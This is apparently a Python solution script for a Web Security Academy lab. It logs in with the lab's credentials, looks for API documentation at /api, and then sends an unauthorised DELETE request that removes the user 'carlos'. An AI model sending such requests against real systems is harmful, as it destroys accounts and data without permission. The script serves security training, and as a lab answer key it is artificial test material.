from web_security_academy.core.logger import logger
from urllib.parse import urljoin


def solve_lab(session):
    session.login("wiener", "peter")

    resp = session.get_path("/api")
    if resp.status_code == 200:
        logger.info("API documentation found at /api")
    else:
        logger.failure("Unable to locate API documentation")

    session.delete(urljoin(session.url, "/api/user/carlos"))
    logger.info('Deleted user "carlos"')
